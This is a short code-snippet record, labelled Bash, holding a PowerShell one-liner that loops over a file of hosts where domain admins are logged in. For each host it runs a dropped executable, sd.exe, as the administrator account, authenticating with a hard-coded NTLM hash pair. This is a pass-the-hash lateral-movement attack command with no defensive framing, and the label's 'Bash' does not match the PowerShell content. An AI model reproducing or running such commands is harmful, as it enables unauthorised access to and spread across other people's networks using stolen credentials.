---
id: 5f33ec1e-9f52-4e6a-b98b-535c3b1ab9fd
type: code
language: Bash
verified: false
created_at: '2020-07-14T18:21:10.753661+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 5f33ec1e

**Language**: Bash

```bash

powershell foreach ($target in (get-content c:\users\username\appdata\local\temp\hosts_da_loggedin_unique.txt)) { "[*] $Target:"; (c:\programdata\sd.exe ./administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:a4bab1c7d4bef62d4c22043ddbf1312c) }`

```


